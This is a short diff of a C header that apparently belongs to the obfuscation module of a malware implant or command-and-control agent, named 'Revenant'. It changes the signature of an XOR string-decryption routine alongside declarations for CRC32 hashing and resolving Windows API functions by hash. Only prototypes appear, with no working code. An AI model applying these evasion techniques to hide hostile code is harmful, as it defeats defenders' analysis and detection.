@@ -8,7 +8,7 @@
 
 uint32_t crc32b(const uint8_t *str);
 wchar_t *str_to_wide(const char* ascii);
-char *xor_dec(char *_s, size_t _s_len, const char *_k, size_t _k_len);
+void xor_dec (const char *input, char *output, const char *key, size_t size) ;
 void *GetProcAddressByHash(void *dll_address, uint32_t function_hash);
 
 #endif //REVENANT_OBFUSCATION_H
